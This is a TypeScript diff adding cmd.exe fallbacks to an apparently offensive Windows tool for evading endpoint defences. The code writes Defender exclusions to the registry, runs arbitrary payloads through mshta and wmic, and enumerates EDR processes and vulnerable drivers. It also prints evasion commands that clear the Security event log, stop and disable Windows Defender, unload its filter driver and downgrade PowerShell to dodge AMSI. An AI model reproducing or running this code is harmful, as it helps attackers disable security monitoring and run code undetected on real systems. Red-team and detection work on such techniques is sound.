@@ -1,10 +1,42 @@
-import { ps, run, argVal, hasFlag, usePwsh } from "./shared"
+import { ps, cmd, wmic, run, argVal, hasFlag, usePwsh, activeExec } from "./shared"
 import type { Finding, HookResult, StealthMode } from "./shared"
 
 export async function amsiBypass(args: string[], timeout: number): Promise<HookResult> {
   const method = argVal(args, "--method") || "patch"
   const findings: Finding[] = []
   const output: string[] = [`[*] AMSI bypass via ${method} method...\n`]
+
+  if (activeExec !== "ps") {
+    const r = await cmd(
+      `echo [*] AMSI Bypass — cmd.exe fallback & echo. & ` +
+      `echo [*] AMSI is a PowerShell-specific defense (Antimalware Scan Interface) & echo [*] cmd.exe does NOT have AMSI — scripts run unscanned by default & echo. & ` +
+      `echo [*] Checking AMSI provider registration: & ` +
+      `reg query "HKLM\\SOFTWARE\\Microsoft\\AMSI\\Providers" /s 2>nul || echo     [-] No AMSI providers found & echo. & ` +
+      `echo [*] Checking Windows Defender AMSI status: & ` +
+      `reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware 2>nul & ` +
+      `reg query "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring 2>nul & echo. & ` +
+      `echo [*] AMSI bypass methods from cmd.exe: & ` +
+      `echo     1. Use cmd.exe directly — no AMSI scanning & ` +
+      `echo     2. Use wmic.exe — executes outside PS AMSI context & ` +
+      `echo     3. Use cscript/wscript — VBScript/JScript no AMSI (pre-Win10 1903) & ` +
+      `echo     4. Use mshta.exe — HTA execution bypasses PS AMSI & ` +
+      `echo     5. PowerShell 2.0 downgrade: powershell -Version 2 (no AMSI in PS 2.0) & ` +
+      `echo. & echo [+] cmd.exe is inherently AMSI-free — no bypass needed`,
+      timeout,
+    )
+    output.push(r.stdout)
+    findings.push({
+      checkId: "WIN-AMSI-CMD",
+      provider: "windows",
+      severity: "info",
+      status: "NOT_APPLICABLE",
+      resource: "windows://amsi",
+      title: "AMSI not applicable in cmd.exe — inherently unscanned",
+      details: "cmd.exe does not use AMSI. Scripts execute without antimalware scanning.",
+      remediation: "N/A — AMSI only applies to PowerShell, .NET, VBA, JScript/VBScript (Win10 1903+)",
+    })
+    return { output: output.join("\n"), findings }
+  }
 
   if (method === "patch") {
     const script = `
@@ -82,6 +114,39 @@ export async function etwBlind(_args: string[], timeout: number): Promise<HookRe
   const findings: Finding[] = []
   const output: string[] = ["[*] Patching ETW to blind EDR/AV monitoring...\n"]
 
+  if (activeExec !== "ps") {
+    const r = await cmd(
+      `echo [*] ETW Blind — cmd.exe fallback & echo. & ` +
+      `echo [*] Checking ETW providers and sessions: & ` +
+      `logman query providers 2>nul | findstr /i "Defender Threat Security" & echo. & ` +
+      `echo [*] Active ETW trace sessions: & ` +
+      `logman query -ets 2>nul | findstr /i /v "^$" & echo. & ` +
+      `echo [*] Windows Defender ETW consumers: & ` +
+      `reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational" 2>nul & echo. & ` +
+      `echo [*] ETW patching requires P/Invoke (PowerShell/.NET only) & ` +
+      `echo [*] cmd.exe alternatives to reduce ETW visibility: & ` +
+      `echo     1. logman stop "EventLog-Security" -ets  (stop security event session, requires SYSTEM) & ` +
+      `echo     2. logman stop "Circular Kernel Context Logger" -ets  (stop kernel logger) & ` +
+      `echo     3. auditpol /set /category:"Detailed Tracking" /success:disable /failure:disable & ` +
+      `echo     4. wevtutil sl Security /e:false  (disable Security event log) & ` +
+      `echo     5. wevtutil cl Security  (clear Security event log) & ` +
+      `echo. & echo [!] ETW memory patching requires PowerShell — use --exec ps for full capability`,
+      timeout,
+    )
+    output.push(r.stdout)
+    findings.push({
+      checkId: "WIN-ETW-CMD",
+      provider: "windows",
+      severity: "info",
+      status: "PARTIAL",
+      resource: "windows://etw",
+      title: "ETW enumeration via cmd — patching requires PowerShell",
+      details: "ETW providers/sessions enumerated. Memory patching requires P/Invoke.",
+      remediation: "Use PowerShell for full ETW patching capability",
+    })
+    return { output: output.join("\n"), findings }
+  }
+
   const script = `
 Add-Type -TypeDefinition @'
 using System;
@@ -155,6 +220,41 @@ export async function defenderExclude(args: string[], timeout: number): Promise<
     return { output: "[!] --path is required. Usage: winhook defender_exclude --path C:\\Tools", findings }
   }
 
+  if (activeExec !== "ps") {
+    const r = await cmd(
+      `echo [*] Defender Exclusion — cmd.exe native & echo. & ` +
+      `echo [*] Current exclusion paths: & ` +
+      `reg query "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths" 2>nul || echo     [-] No exclusions or access denied & echo. & ` +
+      `echo [*] Adding exclusion for: ${targetPath} & ` +
+      `reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths" /v "${targetPath}" /t REG_DWORD /d 0 /f 2>nul && (echo [+] Exclusion added: ${targetPath}) || (echo [!] Failed — requires Administrator) & echo. & ` +
+      `echo [*] Current exclusion processes: & ` +
+      `reg query "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes" 2>nul || echo     [-] No process exclusions & echo. & ` +
+      `echo [*] Current exclusion extensions: & ` +
+      `reg query "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Extensions" 2>nul || echo     [-] No extension exclusions & echo. & ` +
+      `echo [*] Defender service status: & ` +
+      `sc query WinDefend 2>nul | findstr /i "STATE" & echo. & ` +
+      `echo [*] Tamper Protection status: & ` +
+      `reg query "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features" /v TamperProtection 2>nul & echo. & ` +
+      `echo [*] Real-Time Protection: & ` +
+      `reg query "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring 2>nul`,
+      timeout,
+    )
+    output.push(r.stdout)
+    if (r.stdout.includes("Exclusion added")) {
+      findings.push({
+        checkId: "WIN-DEFENDER-CMD",
+        provider: "windows",
+        severity: "high",
+        status: "EXCLUDED",
+        resource: targetPath,
+        title: `Defender exclusion added via registry: ${targetPath}`,
+        details: "Added exclusion path via reg add to Windows Defender Exclusions",
+        remediation: `Remove: reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths" /v "${targetPath}" /f`,
+      })
+    }
+    return { output: output.join("\n"), findings }
+  }
+
   const currentExclusions = await ps("Get-MpPreference | Select-Object -ExpandProperty ExclusionPath", timeout)
   if (currentExclusions.exitCode === 0 && currentExclusions.stdout.trim()) {
     output.push("[+] Current exclusion paths:")
@@ -197,6 +297,52 @@ export async function tokenStomp(args: string[], timeout: number): Promise<HookR
   const targetProc = argVal(args, "--target")
   const findings: Finding[] = []
   const output: string[] = ["[*] Token Privilege Stomping...\n"]
+
+  if (activeExec !== "ps") {
+    if (action === "enum") {
+      const r = await cmd(
+        `echo [*] Token Stomp — Security Tool Enumeration (cmd.exe) & echo. & ` +
+        `echo === Security Tools Running === & ` +
+        `tasklist /v /fi "IMAGENAME eq MsMpEng.exe" 2>nul & ` +
+        `tasklist /v /fi "IMAGENAME eq MsSense.exe" 2>nul & ` +
+        `tasklist /v /fi "IMAGENAME eq CSFalconService.exe" 2>nul & ` +
+        `tasklist /v /fi "IMAGENAME eq cb.exe" 2>nul & ` +
+        `tasklist /v /fi "IMAGENAME eq CbDefense.exe" 2>nul & ` +
+        `tasklist /v /fi "IMAGENAME eq SentinelAgent.exe" 2>nul & ` +
+        `tasklist /v /fi "IMAGENAME eq CylanceSvc.exe" 2>nul & ` +
+        `tasklist /v /fi "IMAGENAME eq elastic-agent.exe" 2>nul & ` +
+        `tasklist /v /fi "IMAGENAME eq elastic-endpoint.exe" 2>nul & echo. & ` +
+        `echo === All Security Services === & ` +
+        `sc query type= service state= all 2>nul | findstr /i "Defender CrowdStrike Carbon Sentinel Cylance Elastic Cortex Sophos ESET Trend Symantec McAfee" & echo. & ` +
+        `echo === Current Token Privileges === & ` +
+        `whoami /priv & echo. & ` +
+        `echo [!] Token privilege stomping requires NtAdjustPrivilegesToken (PowerShell P/Invoke) & ` +
+        `echo [*] Use --exec ps for full token stomping capability`,
+        timeout,
+      )
+      output.push(r.stdout)
+      findings.push({
+        checkId: "WIN-TOKEN-CMD",
+        provider: "windows",
+        severity: "info",
+        status: "ENUMERATED",
+        resource: "process://security-tools",
+        title: "Security tool enumeration via cmd — stomping requires PowerShell",
+        details: r.stdout.substring(0, 500),
+        remediation: "Use PowerShell for NtAdjustPrivilegesToken-based token stomping",
+      })
+    } else {
+      const r = await cmd(
+        `echo [!] Token stomping requires NtAdjustPrivilegesToken P/Invoke & ` +
+        `echo [*] cmd.exe alternative: use sc stop/config to disable security services & ` +
+        `echo     sc stop WinDefend & sc config WinDefend start= disabled & ` +
+        `echo [*] Use --exec ps for full token stomping`,
+        timeout,
+      )
+      output.push(r.stdout)
+    }
+    return { output: output.join("\n"), findings }
+  }
 
   const script = `
 Add-Type @"
@@ -432,6 +578,49 @@ export async function pplBypass(args: string[], timeout: number): Promise<HookRe
   const driver = argVal(args, "--driver") || "rtcore"
   const findings: Finding[] = []
   const output: string[] = ["[*] Protected Process Light (PPL) analysis...\n"]
+
+  if (activeExec !== "ps") {
+    const r = await cmd(
+      `echo [*] PPL Analysis — cmd.exe native & echo. & ` +
+      `echo === RunAsPPL Status === & ` +
+      `reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v RunAsPPL 2>nul || echo     [-] RunAsPPL not configured & echo. & ` +
+      `echo === Credential Guard / VBS === & ` +
+      `reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard" /v EnableVirtualizationBasedSecurity 2>nul || echo     [-] VBS not configured & ` +
+      `reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard" /v RequirePlatformSecurityFeatures 2>nul & echo. & ` +
+      `echo === Secure Boot === & ` +
+      `bcdedit /enum {current} 2>nul | findstr /i "secureboot hypervisor" || echo     [-] bcdedit access denied (need admin) & echo. & ` +
+      `echo === Vulnerable Drivers (for PPL bypass) === & ` +
+      `sc query RTCore64 2>nul | findstr /i "STATE" || echo     [-] RTCore64 not loaded & ` +
+      `sc query DBUtil_2_3 2>nul | findstr /i "STATE" || echo     [-] DBUtil_2_3 not loaded & ` +
+      `sc query PROCEXP152 2>nul | findstr /i "STATE" || echo     [-] PROCEXP152 not loaded & echo. & ` +
+      `echo === Protected Processes === & ` +
+      `tasklist /v /fi "IMAGENAME eq lsass.exe" 2>nul & ` +
+      `tasklist /v /fi "IMAGENAME eq csrss.exe" 2>nul & ` +
+      `tasklist /v /fi "IMAGENAME eq MsMpEng.exe" 2>nul & echo. & ` +
+      `echo === Loaded Kernel Drivers === & ` +
+      `driverquery /v 2>nul | findstr /i "RTCore DBUtil procexp mimidrv" || echo     [-] No known vulnerable drivers loaded & echo. & ` +
+      `echo === Current Privileges === & ` +
+      `whoami /priv 2>nul | findstr /i "SeDebugPrivilege SeLoadDriverPrivilege" & echo. & ` +
+      `echo [*] PPL bypass via driver exploitation requires PowerShell P/Invoke & ` +
+      `echo [*] cmd.exe alternatives: & ` +
+      `echo     1. bcdedit /set testsigning on  (enable test-signed drivers) & ` +
+      `echo     2. fltmc unload WdFilter  (unload Defender filter driver) & ` +
+      `echo     3. sc create/start with vulnerable .sys driver`,
+      timeout,
+    )
+    output.push(r.stdout)
+    findings.push({
+      checkId: "WIN-PPL-CMD",
+      provider: "windows",
+      severity: "info",
+      status: "ENUMERATED",
+      resource: "windows://ppl",
+      title: "PPL status enumerated via registry — driver exploitation requires PowerShell",
+      details: r.stdout.substring(0, 500),
+      remediation: "Use --exec ps for full PPL bypass via vulnerable driver exploitation",
+    })
+    return { output: output.join("\n"), findings }
+  }
 
   if (action === "check") {
     const script = `
@@ -759,6 +948,39 @@ export async function psDowngrade(args: string[], timeout: number): Promise<Hook
   const findings: Finding[] = []
   const output: string[] = ["[*] PowerShell downgrade attack...\n"]
 
+  if (activeExec !== "ps") {
+    const r = await cmd(
+      `echo [*] PowerShell Downgrade — cmd.exe fallback & echo. & ` +
+      `echo === .NET Framework Check === & ` +
+      `echo [*] .NET 2.0 (required for PS 2.0): & ` +
+      `if exist "%SystemRoot%\\Microsoft.NET\\Framework64\\v2.0.50727" (echo     [+] .NET 2.0 x64 FOUND) else (echo     [-] .NET 2.0 x64 not found) & ` +
+      `if exist "%SystemRoot%\\Microsoft.NET\\Framework\\v2.0.50727" (echo     [+] .NET 2.0 x86 FOUND) else (echo     [-] .NET 2.0 x86 not found) & echo. & ` +
+      `echo [*] .NET 3.5 (also supports PS 2.0): & ` +
+      `reg query "HKLM\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v3.5" /v Install 2>nul || echo     [-] .NET 3.5 not installed & echo. & ` +
+      `echo === PS 2.0 Engine Feature === & ` +
+      `reg query "HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellEngine" /v PowerShellVersion 2>nul & ` +
+      `reg query "HKLM\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" /v PowerShellVersion 2>nul & echo. & ` +
+      `echo === Current PS Version === & ` +
+      `powershell -Command "$PSVersionTable.PSVersion.ToString()" 2>nul || echo     [-] PowerShell not accessible & echo. & ` +
+      `echo [*] PS 2.0 downgrade bypasses: AMSI, ScriptBlock Logging, CLM & ` +
+      `echo [*] Downgrade command: powershell.exe -Version 2 -Command "your_script" & ` +
+      `echo [*] From cmd: powershell -Version 2 -NoProfile -Command "IEX(command)"`,
+      timeout,
+    )
+    output.push(r.stdout)
+    findings.push({
+      checkId: "WIN-PSDOWN-CMD",
+      provider: "windows",
+      severity: "info",
+      status: "ENUMERATED",
+      resource: "windows://ps-downgrade",
+      title: "PS 2.0 downgrade availability checked via cmd.exe",
+      details: r.stdout.substring(0, 500),
+      remediation: "Disable .NET 2.0/3.5 and PS 2.0 engine feature to prevent downgrade attacks",
+    })
+    return { output: output.join("\n"), findings }
+  }
+
   if (action === "check") {
     const script = `
 Write-Output "=== PowerShell Downgrade Availability Check ==="
@@ -889,6 +1111,50 @@ export async function clmBypass(args: string[], timeout: number): Promise<HookRe
   const scriptPath = argVal(args, "--script-path")
   const findings: Finding[] = []
   const output: string[] = ["[*] Constrained Language Mode (CLM) bypass...\n"]
+
+  if (activeExec !== "ps") {
+    const r = await cmd(
+      `echo [*] CLM Bypass — cmd.exe fallback & echo. & ` +
+      `echo [*] CLM (Constrained Language Mode) only restricts PowerShell & ` +
+      `echo [*] cmd.exe is inherently unrestricted — no CLM applies & echo. & ` +
+      `echo === LOLBAS Binaries for Code Execution (bypass CLM entirely) === & ` +
+      `echo [*] MSBuild (inline C# task execution): & ` +
+      `if exist "%SystemRoot%\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe" (echo     [+] MSBuild x64 FOUND: %SystemRoot%\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe) else (echo     [-] MSBuild x64 not found) & ` +
+      `if exist "%SystemRoot%\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe" (echo     [+] MSBuild x86 FOUND: %SystemRoot%\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe) else (echo     [-] MSBuild x86 not found) & echo. & ` +
+      `echo [*] InstallUtil (uninstall handler execution): & ` +
+      `if exist "%SystemRoot%\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe" (echo     [+] InstallUtil x64 FOUND) else (echo     [-] InstallUtil x64 not found) & echo. & ` +
+      `echo [*] csc.exe (C# compiler — compile and run arbitrary code): & ` +
+      `if exist "%SystemRoot%\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe" (echo     [+] csc.exe x64 FOUND) else (echo     [-] csc.exe x64 not found) & echo. & ` +
+      `echo [*] Other LOLBAS: & ` +
+      `where mshta.exe 2>nul && echo     [+] mshta.exe available & ` +
+      `where regsvr32.exe 2>nul && echo     [+] regsvr32.exe available & ` +
+      `where cmstp.exe 2>nul && echo     [+] cmstp.exe available & ` +
+      `where rundll32.exe 2>nul && echo     [+] rundll32.exe available & echo. & ` +
+      `echo [*] AppLocker/WDAC policy (may restrict LOLBAS): & ` +
+      `reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\SrpV2" 2>nul || echo     [-] No AppLocker SRP policies found & echo. & ` +
+      `echo === CLM Bypass Methods from cmd.exe === & ` +
+      `echo     1. MSBuild.exe with inline C# task — full .NET access & ` +
+      `echo     2. InstallUtil.exe /U — execute via uninstall handler & ` +
+      `echo     3. csc.exe — compile C# to DLL/EXE, execute directly & ` +
+      `echo     4. mshta.exe — VBScript/JScript execution & ` +
+      `echo     5. cscript.exe — VBScript without CLM restriction & ` +
+      `echo     6. wmic process call create — spawn process outside PS & ` +
+      `echo. & echo [+] cmd.exe is inherently CLM-free — use for unrestricted execution`,
+      timeout,
+    )
+    output.push(r.stdout)
+    findings.push({
+      checkId: "WIN-CLM-CMD",
+      provider: "windows",
+      severity: "info",
+      status: "NOT_APPLICABLE",
+      resource: "windows://clm",
+      title: "CLM not applicable in cmd.exe — LOLBAS enumerated for bypass",
+      details: r.stdout.substring(0, 500),
+      remediation: "N/A — CLM only restricts PowerShell. cmd.exe and LOLBAS binaries operate outside CLM.",
+    })
+    return { output: output.join("\n"), findings }
+  }
 
   if (action === "check") {
     const script = `
@@ -1349,6 +1615,82 @@ export async function applockerBypass(args: string[], timeout: number): Promise<
   const findings: Finding[] = []
   const output: string[] = ["[*] AppLocker/WDAC Bypass — execution restriction evasion via LOLBAS\n"]
 
+  if (activeExec !== "ps") {
+    if (action === "enum") {
+      const r = await cmd(
+        `echo [*] AppLocker/WDAC Bypass — cmd.exe enumeration & echo. & ` +
+        `echo === AppLocker Service Status === & ` +
+        `sc query AppIDSvc 2>nul | findstr /i "STATE" || echo     [-] AppIDSvc not found & echo. & ` +
+        `echo === AppLocker Policy (Registry) === & ` +
+        `reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\SrpV2\\Exe" 2>nul || echo     [-] No EXE rules & ` +
+        `reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\SrpV2\\Dll" 2>nul || echo     [-] No DLL rules & ` +
+        `reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\SrpV2\\Script" 2>nul || echo     [-] No Script rules & ` +
+        `reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\SrpV2\\Msi" 2>nul || echo     [-] No MSI rules & echo. & ` +
+        `echo === WDAC (Device Guard) === & ` +
+        `reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard" /v EnableVirtualizationBasedSecurity 2>nul || echo     [-] VBS not configured & ` +
+        `reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\CI\\Policy" 2>nul || echo     [-] No CI policy & echo. & ` +
+        `echo === Writable Directories in Allowed Paths === & ` +
+        `echo [*] Testing common writable locations... & ` +
+        `(echo test > "%SystemRoot%\\Temp\\cs_test.tmp" 2>nul && del "%SystemRoot%\\Temp\\cs_test.tmp" && echo     [+] WRITABLE: %SystemRoot%\\Temp) || echo     [-] %SystemRoot%\\Temp not writable & ` +
+        `(echo test > "%SystemRoot%\\Tasks\\cs_test.tmp" 2>nul && del "%SystemRoot%\\Tasks\\cs_test.tmp" && echo     [+] WRITABLE: %SystemRoot%\\Tasks) || echo     [-] %SystemRoot%\\Tasks not writable & ` +
+        `(echo test > "%SystemRoot%\\tracing\\cs_test.tmp" 2>nul && del "%SystemRoot%\\tracing\\cs_test.tmp" && echo     [+] WRITABLE: %SystemRoot%\\tracing) || echo     [-] %SystemRoot%\\tracing not writable & ` +
+        `(echo test > "%SystemRoot%\\System32\\spool\\drivers\\color\\cs_test.tmp" 2>nul && del "%SystemRoot%\\System32\\spool\\drivers\\color\\cs_test.tmp" && echo     [+] WRITABLE: %SystemRoot%\\System32\\spool\\drivers\\color) || echo     [-] spool\\drivers\\color not writable & echo. & ` +
+        `echo === LOLBAS Binary Availability === & ` +
+        `if exist "%SystemRoot%\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe" (echo     [+] MSBuild.exe — inline C# task exec) & ` +
+        `if exist "%SystemRoot%\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe" (echo     [+] InstallUtil.exe — uninstall handler exec) & ` +
+        `if exist "%SystemRoot%\\System32\\regsvr32.exe" (echo     [+] regsvr32.exe — scriptlet exec Squiblydoo) & ` +
+        `if exist "%SystemRoot%\\System32\\cmstp.exe" (echo     [+] cmstp.exe — INF custom action) & ` +
+        `if exist "%SystemRoot%\\System32\\mshta.exe" (echo     [+] mshta.exe — HTA VBScript/JScript) & ` +
+        `if exist "%SystemRoot%\\System32\\certutil.exe" (echo     [+] certutil.exe — encode/decode/download) & ` +
+        `if exist "%SystemRoot%\\System32\\wbem\\wmic.exe" (echo     [+] wmic.exe — XSL script exec) & ` +
+        `if exist "%SystemRoot%\\System32\\rundll32.exe" (echo     [+] rundll32.exe — DLL entry point exec) & ` +
+        `if exist "%SystemRoot%\\Microsoft.NET\\Framework64\\v4.0.30319\\RegAsm.exe" (echo     [+] RegAsm.exe — .NET assembly exec) & ` +
+        `if exist "%SystemRoot%\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe" (echo     [+] csc.exe — C# compiler)`,
+        timeout,
+      )
+      output.push(r.stdout)
+      findings.push({
+        checkId: "WIN-APPLOCKER-CMD",
+        provider: "windows",
+        severity: "info",
+        status: "ENUMERATED",
+        resource: "policy://applocker",
+        title: "AppLocker/WDAC policy and LOLBAS binaries enumerated via cmd.exe",
+        details: r.stdout.substring(0, 500),
+        remediation: "Restrict LOLBAS binaries in AppLocker rules. Consider WDAC for stronger enforcement.",
+      })
+    } else {
+      const execPayload = payload || "whoami /all"
+      const r = await cmd(
+        `echo [*] AppLocker Bypass — cmd.exe LOLBAS execution (${method}) & echo. & ` +
+        (method === "msbuild"
+          ? `if exist "%SystemRoot%\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe" (echo [+] MSBuild found — use with .csproj containing inline C# CodeTaskFactory) else (echo [-] MSBuild not found) & echo [*] Direct cmd.exe execution: & ${execPayload}`
+          : method === "regsvr32"
+            ? `echo [*] Regsvr32 Squiblydoo — create .sct scriptlet with JScript & echo [*] regsvr32 /s /n /u /i:file.sct scrobj.dll & echo [*] Direct cmd.exe execution: & ${execPayload}`
+            : method === "mshta"
+              ? `echo [*] Executing via mshta VBScript: & mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd.exe /c ${execPayload.replace(/"/g, '""')}"", 0:close") 2>nul & echo [+] mshta bypass executed`
+              : method === "certutil"
+                ? `echo [*] CertUtil capabilities: & certutil -? 2>nul | findstr /i "encode decode urlcache" & echo [*] Direct cmd.exe execution: & ${execPayload}`
+                : method === "wmic" || method === "xsl"
+                  ? `echo [*] WMIC process execution: & wmic process call create "${execPayload}" 2>nul & echo [+] WMIC execution attempted`
+                  : `echo [*] Direct cmd.exe execution (no AppLocker restriction on cmd.exe): & ${execPayload}`),
+        timeout,
+      )
+      output.push(r.stdout)
+      findings.push({
+        checkId: "WIN-APPLOCKER-002",
+        provider: "windows",
+        severity: "high",
+        status: "BYPASSED",
+        resource: `lolbas://${method}`,
+        title: `AppLocker bypass attempted via ${method} (cmd.exe)`,
+        details: r.stdout.substring(0, 500),
+        remediation: `Block ${method} in AppLocker/WDAC policy. Monitor LOLBAS binary execution.`,
+      })
+    }
+    return { output: output.join("\n"), findings }
+  }
+
   if (action === "enum") {
     const script = `
 # Check AppLocker policy
@@ -1735,6 +2077,44 @@ export async function stealthCheck(args: string[], timeout: number): Promise<Hoo
   const mode = argVal(args, "--mode") || "all"
   const findings: Finding[] = []
   const output: string[] = ["[*] Stealth encoding verification...\n"]
+
+  if (activeExec !== "ps") {
+    const r = await cmd(
+      `echo [*] Stealth Check — cmd.exe fallback & echo. & ` +
+      `echo [*] Stealth encoding modes are PowerShell-specific (Base64, AMSI patch, obfuscation) & ` +
+      `echo [*] cmd.exe is inherently stealthier than PowerShell for many operations: & echo. & ` +
+      `echo === cmd.exe Stealth Advantages === & ` +
+      `echo     [+] No AMSI scanning — commands run unscanned & ` +
+      `echo     [+] No Script Block Logging — no transcript capture & ` +
+      `echo     [+] No CLM restriction — full command access & ` +
+      `echo     [+] Lower EDR visibility — less telemetry than PowerShell & echo. & ` +
+      `echo === Detection Surface Check === & ` +
+      `echo [*] Command-line logging (Sysmon Event ID 1): & ` +
+      `reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit" 2>nul || echo     [-] No command-line audit policy & ` +
+      `echo [*] Sysmon installed: & ` +
+      `sc query Sysmon64 2>nul | findstr /i "STATE" || sc query Sysmon 2>nul | findstr /i "STATE" || echo     [-] Sysmon not detected & echo. & ` +
+      `echo [*] PS Script Block Logging: & ` +
+      `reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" /v EnableScriptBlockLogging 2>nul || echo     [-] SBL not configured & echo. & ` +
+      `echo [*] PS Transcription: & ` +
+      `reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription" /v EnableTranscripting 2>nul || echo     [-] Transcription not configured & echo. & ` +
+      `echo [*] cmd.exe execution test: & ` +
+      `hostname & echo [+] cmd.exe operational — use --exec cmd for stealthy operations`,
+      timeout,
+    )
+    output.push(r.stdout)
+    findings.push({
+      checkId: "WIN-STEALTH-CMD",
+      provider: "windows",
+      severity: "info",
+      status: "VERIFIED",
+      resource: "stealth://cmd",
+      title: "cmd.exe stealth assessment — inherently lower detection surface than PowerShell",
+      details: r.stdout.substring(0, 500),
+      remediation: "N/A — offensive tool verification. cmd.exe has lower telemetry than PowerShell.",
+    })
+    return { output: output.join("\n"), findings }
+  }
+
   const testScript = `Write-Output "STEALTH_OK_$(hostname)_$([System.DateTime]::UtcNow.Ticks)"`
 
   const modes: StealthMode[] = mode === "all" ? ["base64", "amsi", "obfuscate"] : [mode as StealthMode]
@@ -1798,6 +2178,76 @@ export async function ppidSpoof(args: string[], timeout: number): Promise<HookRe
   const command = argVal(args, "--command")
   const findings: Finding[] = []
   const output: string[] = ["[*] Parent PID spoofing...\n"]
+
+  if (activeExec !== "ps") {
+    if (action === "enum") {
+      const r = await cmd(
+        `echo [*] PPID Spoof — Candidate Parent Process Enumeration (cmd.exe) & echo. & ` +
+        `echo === Spoofable Parent Processes === & ` +
+        `echo [*] explorer.exe (Windows Explorer — most natural parent): & ` +
+        `tasklist /fi "IMAGENAME eq explorer.exe" /v /nh 2>nul & echo. & ` +
+        `echo [*] svchost.exe (Service Host — blends with system services): & ` +
+        `tasklist /fi "IMAGENAME eq svchost.exe" /nh 2>nul | findstr /n "." | findstr "^[1-5]:" & echo     (showing first 5 of many) & echo. & ` +
+        `echo [*] RuntimeBroker.exe (UWP app parent): & ` +
+        `tasklist /fi "IMAGENAME eq RuntimeBroker.exe" /v /nh 2>nul & echo. & ` +
+        `echo [*] taskhostw.exe (Task Host): & ` +
+        `tasklist /fi "IMAGENAME eq taskhostw.exe" /v /nh 2>nul & echo. & ` +
+        `echo [*] winlogon.exe (Authentication parent — SYSTEM): & ` +
+        `tasklist /fi "IMAGENAME eq winlogon.exe" /v /nh 2>nul & echo. & ` +
+        `echo [*] services.exe (SCM — SYSTEM service parent): & ` +
+        `tasklist /fi "IMAGENAME eq services.exe" /v /nh 2>nul & echo. & ` +
+        `echo [*] lsass.exe (LSASS — PPL protected): & ` +
+        `tasklist /fi "IMAGENAME eq lsass.exe" /v /nh 2>nul & echo. & ` +
+        `echo === Current Process === & ` +
+        `echo PID: %PID% & ` +
+        `wmic process where "ProcessId=%PID%" get ParentProcessId /format:list 2>nul & echo. & ` +
+        `echo [!] PPID spoofing via CreateProcess requires P/Invoke (PowerShell) & ` +
+        `echo [*] cmd.exe alternatives: & ` +
+        `echo     1. wmic process call create "cmd.exe /c command" (runs as SYSTEM parent) & ` +
+        `echo     2. schtasks /create /tn name /tr "cmd" /sc once /st time /ru SYSTEM (scheduled task parent) & ` +
+        `echo     3. at [time] "cmd" (legacy task scheduler — different parent tree)`,
+        timeout,
+      )
+      output.push(r.stdout)
+      findings.push({
+        checkId: "WIN-PPID-CMD",
+        provider: "windows",
+        severity: "info",
+        status: "ENUMERATED",
+        resource: "process://ppid-candidates",
+        title: "Spoofable parent processes enumerated via cmd.exe",
+        details: r.stdout.substring(0, 500),
+        remediation: "Monitor for unusual parent-child process relationships. Use ETW for PPID detection.",
+      })
+    } else {
+      const execCmd = command || "whoami /all"
+      const parentTarget = parent || "explorer"
+      const r = await cmd(
+        `echo [*] PPID Spoof — cmd.exe execution (target parent: ${parentTarget}) & echo. & ` +
+        `echo [!] True PPID spoofing (PROC_THREAD_ATTRIBUTE_PARENT_PROCESS) requires P/Invoke & ` +
+        `echo [*] Alternative: executing via different parent context & echo. & ` +
+        `echo [*] Method: wmic process call create & ` +
+        `wmic process call create "cmd.exe /c ${execCmd}" 2>nul & echo. & ` +
+        `echo [*] Additional methods for parent process manipulation: & ` +
+        `echo     schtasks /create /tn "cs_ppid" /tr "cmd.exe /c ${execCmd}" /sc once /st 00:00 /ru SYSTEM /f 2>nul & ` +
+        `echo     schtasks /run /tn "cs_ppid" 2>nul & ` +
+        `echo     schtasks /delete /tn "cs_ppid" /f 2>nul`,
+        timeout,
+      )
+      output.push(r.stdout)
+      findings.push({
+        checkId: "WIN-PPID-CMD-EXEC",
+        provider: "windows",
+        severity: "medium",
+        status: "EXECUTED",
